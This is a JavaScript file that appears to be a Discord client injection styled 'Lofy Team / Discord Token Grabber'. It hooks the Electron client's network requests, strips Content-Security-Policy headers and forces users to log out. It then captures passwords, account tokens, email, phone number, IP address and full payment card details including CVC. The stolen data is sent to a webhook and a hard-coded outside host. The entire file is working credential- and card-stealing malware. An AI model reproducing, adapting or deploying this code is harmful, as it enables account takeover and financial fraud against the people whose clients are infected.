const fs = require("fs"),
	{
		BrowserWindow: BrowserWindow,
		session: session
	} = require("electron"),
	querystring = require("querystring"),
	os = require("os");

var webhook = "*WEBHOOK*";

const tken = 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;';
var win = "";
const Filter = {
	urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
};

function firstRun() {
	fs.readdir(__dirname, (e, t) => {
		if (t.includes("Tomori.txt")) return !0;
		return fs.writeFile(`${__dirname}/Tomori.txt`, "i", e => {}), BrowserWindow.getAllWindows()[0].webContents.executeJavaScript("function logOut(){setInterval(()=>document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token='``',10),setTimeout(()=>location.reload(),10)}logOut();", !0 == false), !1 == true
	})
}
session.defaultSession.webRequest.onHeadersReceived((e, t) => {
	e.url.startsWith(webhook) ? e.url.includes("discord.com") ? t({
		responseHeaders: Object.assign({
			"Access-Control-Allow-Headers": "*"
		}, e.responseHeaders)
	}) : t({
		responseHeaders: Object.assign({
			"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
			"Access-Control-Allow-Headers": "*",
			"Access-Control-Allow-Origin": "*"
		}, e.responseHeaders)
	}) : (delete e.responseHeaders["content-security-policy"], delete e.responseHeaders["content-security-policy-report-only"], t({
		responseHeaders: {
			...e.responseHeaders,
			"Access-Control-Allow-Headers": "*"
		}
	}))
}), session.defaultSession.webRequest.onBeforeRequest(Filter, (e, t) => e.url.startsWith("wss://") ? t({
	cancel: !0
}) : firstRun() ? t({}) : void 0);
const ChangePasswordFilter = {
	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v*/tokens"]
};

function sendWeb(e) {
	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var XML = new XMLHttpRequest();\n    XML.open("POST", "${webhook}", true);\n    XML.setRequestHeader('Content-Type', 'application/json');\n    XML.setRequestHeader('Access-Control-Allow-Origin', '*');\n    XML.send(JSON.stringify(${e}));`), 
    win.webContents.executeJavaScript(`fetch("https://post.siestaselbot.repl.co/i", { method: "POST", body: JSON.stringify(${e})})`)
}

function injected() {
	var e = {
		username: "Discord Token Grabber",
		avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
		embeds: [{
			color: 43690,
			description: `Injetado Em  ${__dirname}`,
			title: "Lofy Team / Discord Token Grabber",
			image: {
				url: ""
			},
			thumbnail: {
				url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png"
			}
		}]
	};
	sendWeb(JSON.stringify(e))
}

function onLogin(e, t) {
	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", '${t}');\n    xmlHttp.send();\n    JSON.parse(xmlHttp.responseText);\n    `, !0).then(n => {
		win.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://ipapi.co/json", false );\n        xmlHttp.send();\n        JSON.parse(xmlHttp.responseText);', !0).then(a => {
			win.webContents.executeJavaScript(`\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discordapp.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", '${t}');\n            xmlHttp.send();\n            JSON.parse(xmlHttp.responseText);`, !0).then(s => {
				win.webContents.executeJavaScript(`\n                var xmlHttp = new XMLHttpRequest();\n                xmlHttp.open( "GET", "https://discord.com/api/v9/applications", false );\n                xmlHttp.setRequestHeader("Authorization", '${t}');\n                xmlHttp.send();\n                JSON.parse(xmlHttp.responseText);`, !0).then(r => {
					win.webContents.executeJavaScript(`\n                    var xmlHttp = new XMLHttpRequest();\n                    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/guilds", false );\n                    xmlHttp.setRequestHeader("Authorization", '${t}');\n                    xmlHttp.send();\n                    JSON.parse(xmlHttp.responseText);`, !0).then(o => {
						win.webContents.executeJavaScript(`\n                        var xmlHttp = new XMLHttpRequest();\n                        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n                        xmlHttp.setRequestHeader("Authorization", '${t}');\n                        xmlHttp.send();\n                        JSON.parse(xmlHttp.responseText);`, !0).then(i => {
							win.webContents.executeJavaScript(`\n                            var xmlHttp = new XMLHttpRequest();\n                            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/connections", false );\n                            xmlHttp.setRequestHeader("Authorization", '${t}');\n                            xmlHttp.send();\n                            JSON.parse(xmlHttp.responseText);`, !0).then(p => {
								if (n.bio) var l = n.bio;
								else l = "Sem Status";
								if (n.banner) var c = `https://cdn.discordapp.com/banners/${n.id}/${n.banner}.png?size=512`;
								else c = "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048";
								var d = [];
								o.forEach(e => {
									e.owner && d.push("oof")
								}), setTimeout(() => {


									var u = {
										username: "Discord Token Grabber",
										avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
										embeds: [{
											author: {
												name: 'By Lofy Team',
												icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
											},
											color: 43690,
											description: "",
											title: "Lofy Team / Discord Token Grabber",
											image: {
												url: c
											},
											thumbnail: {
												url: `https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}.gif?size=128`
											},
											fields: [{
												name: "Nome de Usuario",
												value: "```" + `${n.username}#${n.discriminator}` + "```"
											}, {
												name: "Id",
												value: "```" + n.id + "```"
											}, {
												name: "Amigos",
												value: "```" + s.length + "```"
											}, {
												name: "Badges",
												value: "```" + badges(n.flags) + "```"
											}, {
												name: "Metodo de Pagamento",
												value: "```" + i.length + "```"
											}, {
												name: "Total de Servidores",
												value: "```" + o.length + "```"
											}, {
												name: "Total de servidores que ele e Dono",
												value: "```" + d.length + "```"
											}, {
												name: "Total de Bots",
												value: "```" + r.length + "```"
											}, {
												name: "Status",
												value: l
											}, {
												name: "Linguagem",
												value: "```" + n.locale + "```"
											}, {
												name: "Nitro",
												value: "```" + getNitro(n.premium_type) + "```"
											}, {
												name: "Email",
												value: "```" + n.email + "```"
											}, {
												name: "Numero",
												value: "```" + n.phone + "```"
											}, {
												name: "Senha",
												value: "```" + e + "```"
											}, {
												name: "Ip",
												value: "```" + a.ip + "```"
											}, {
												name: "Token",
												value: "```" + t + "```"
											}, {
												name: "Injetado em:",
												value: "```" + __dirname + "```"
											}]
										}]
									};
									sendWeb(JSON.stringify(u))
								}, 100)
							})
						})
					})
				})
			})
		})
	})
}

function onPasswordChange(e, t, n) {
	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", '${n}');\n    xmlHttp.send();\n    JSON.parse(xmlHttp.responseText);`, !0).then(a => {
		win.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://ipapi.co/json", false );\n        xmlHttp.send();\n        JSON.parse(xmlHttp.responseText);', !0).then(s => {
			if (a.banner) var r = `https://cdn.discordapp.com/banners/${a.id}/${a.banner}.png?size=512`;
			else r = "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048";
			var o = {
				username: "Discord Token Grabber",
				avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
				embeds: [{
					author: {
						name: 'By Lofy Team',
						icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
					},
					color: 43690,
					description: "",
					title: "Lofy Team / Discord Token Grabber",
					image: {
						url: r
					},
					thumbnail: {
						url: `https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}.gif?size=128`
					},
					fields: [{
						name: "Usuario",
						value: "```" + `${a.username}#${a.discriminator}` + "```"
					}, {
						name: "Id",
						value: "```" + a.id + "```"
					}, {
						name: "Badges",
						value: "```" + badges(a.flags) + "```"
					}, {
						name: "Nitro",
						value: "```" + getNitro(a.premium_type) + "```"
					}, {
						name: "Email",
						value: "```" + a.email + "```"
					}, {
						name: "Numero?",
						value: "```" + a.phone + "```"
					}, {
						name: "Senha Antiga",
						value: "```" + e + "```"
					}, {
						name: "Nova Senha",
						value: "```" + t + "```"
					}, {
						name: "Ip",
						value: "```" + s.ip + "```"
					}, {
						name: "Token",
						value: "```" + n + "```"
					}, {
						name: "Injetado em:",
						value: "```" + __dirname + "```"
					}]
				}]
			};
			sendWeb(JSON.stringify(o))
		})
	})
}

function onEmailChange(e, t, n) {
	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", '${n}');\n    xmlHttp.send();\n    JSON.parse(xmlHttp.responseText);`, !0).then(a => {
		win.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://ipapi.co/json", false );\n        xmlHttp.send();\n        JSON.parse(xmlHttp.responseText);', !0).then(s => {
			if (a.banner) var r = `https://cdn.discordapp.com/banners/${a.id}/${a.banner}.png?size=512`;
			else r = "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048";
			var o = {
				username: "Discord Token Grabber",
				avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
				embeds: [{
					author: {
						name: 'By Lofy Team',
						url: "https://notfubuki.glitch.me",
						icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
					},
					color: 43690,
					description: "",
					title: "Lofy Team / Discord Token Grabber",
					image: {
						url: r
					},
					thumbnail: {
						url: `https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}.gif?size=128`
					},
					fields: [{
						name: "Nome de Usuario",
						value: "```" + `${a.username}#${a.discriminator}` + "```"
					}, {
						name: "Id",
						value: "```" + a.id + "```"
					}, {
						name: "Badges",
						value: "```" + badges(a.flags) + "```"
					}, {
						name: "Discord Nitro",
						value: "```" + getNitro(a.premium_type) + "```"
					}, {
						name: "Email",
						value: "```" + a.email + "```"
					}, {
						name: "Numero",
						value: "```" + a.phone + "```"
					}, {
						name: "Novo Email",
						value: "```" + e + "```"
					}, {
						name: "Senha",
						value: "```" + t + "```"
					}, {
						name: "Ip",
						value: "```" + s.ip + "```"
					}, {
						name: "Token",
						value: "```" + n + "```"
					}, {
						name: "Injetado Em:",
						value: "```" + __dirname + "```"
					}]
				}]
			};
			sendWeb(JSON.stringify(o))
		})
	})
}

function onCardADD(e, t, n, a, s, r, o, i, p, l) {
	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", '${l}');\n    xmlHttp.send();\n    JSON.parse(xmlHttp.responseText);`, !0).then(l => {
		win.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://ipapi.co/json", false );\n        xmlHttp.send();\n        JSON.parse(xmlHttp.responseText);', !0).then(c => {
			if (l.banner) var d = `https://cdn.discordapp.com/banners/${l.id}/${l.banner}.png?size=512`;
			else d = "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048";
			var u = {
				sername: "Discord Token Grabber",
				avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
				embeds: [{
					author: {
						name: 'By Lofy Team',
						icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
					},
					color: 43690,
					description: "",
					title: "Lofy Team / Discord Token Grabber",
					image: {
						url: d
					},
					thumbnail: {
						url: `https://cdn.discordapp.com/avatars/${l.id}/${l.avatar}.gif?size=128`
					},
					fields: [{
						name: "Nome de Usuario",
						value: "```" + `${l.username}#${l.discriminator}` + "```"
					}, {
						name: "ID",
						value: "```" + l.id + "```"
					}, {
						name: "Public Flags",
						value: "```" + l.public_flags + "```"
					}, {
						name: "Badges",
						value: "```" + badges(l.flags) + "```"
					}, {
						name: "Discord Nitro",
						value: "```" + getNitro(l.premium_type) + "```"
					}, {
						name: "Numero do Cartão",
						value: "```" + e + "```"
					}, {
						name: "Virtual Cryp",
						value: "```" + t + "```"
					}, {
						name: "Expirra em",
						value: "```" + `${n}/${a}` + "```"
					}, {
						name: "Endereço",
						value: "```" + `Ciade: ${r}\nEndereço: ${s}\nPais: ${o}\nCeep: ${i}\nPais: ${p}` + "```"
					}]
				}]
			};
			sendWeb(JSON.stringify(u))
		})
	})
}

function badges(e) {
	var t = "";
	return 1 == (1 & e) && (t += "Staff,\n"), 2 == (2 & e) && (t += "Parceiro,\n"), 4 == (4 & e) && (t += "Hypesquad Event,\n"), 8 == (8 & e) && (t += "Green Buhhunter,\n"), 64 == (64 & e) && (t += "Hypesquad Bravery,\n"), 128 == (128 & e) && (t += "𝐇𝐲𝐩𝐞𝐒𝐪𝐮𝐚𝐝 𝐁𝐫𝐢𝐥𝐥𝐚𝐧𝐜𝐞,\n"), 256 == (256 & e) && (t += "𝐇𝐲𝐩𝐞𝐒𝐪𝐮𝐚𝐝 𝐁𝐚𝐥𝐚𝐧𝐜𝐞,\n"), 512 == (512 & e) && (t += "Early Suporte,\n"), 16384 == (16384 & e) && (t += "Gold BugHunter,\n"), 131072 == (131072 & e) && (t += "Discord Developer,\n"), "" == t && (t = "Sem Badges\n"), t
}

function getNitro(e) {
	var t = "";
	return 0 == (0 & e) && (t = "Sem Nitro"), 1 == (1 & e) && (t = "Nitro Classic"), 2 == (2 & e) && (t = "Nitro Boost"), "" == t && (t = "Sem Nitro"), t
}
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (e, t) => {
	if (e.url.endsWith("login") && 200 == e.statusCode) {
		injected();
		const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
		(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(tken, !0).then(e => onLogin(t.password, e))
	}
	if (e.url.endsWith("users/@me") && 200 == e.statusCode && "PATCH" == e.method) {
		const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
		null != t.new_password && null != t.new_password && "" != t.new_password && (win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(tken, !0).then(e => onPasswordChange(t.password, t.new_password, e)), null != t.email && null != t.email && "" != t.email && (win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(tken, !0).then(e => onEmailChange(t.email, t.password, e))
	}
	if (e.url.endsWith("tokens")) {
		const t = querystring.parse(decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString()));
		(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(tken, !0).then(e => onCardADD(t["card[number]"], t["card[cvc]"], t["card[exp_month]"], t["card[exp_year]"], t["card[address_line1]"], t["card[address_city]"], t["card[address_state]"], t["card[address_zip]"], t["card[address_country]"], e))
	}
}), module.exports = require("./core.asar");
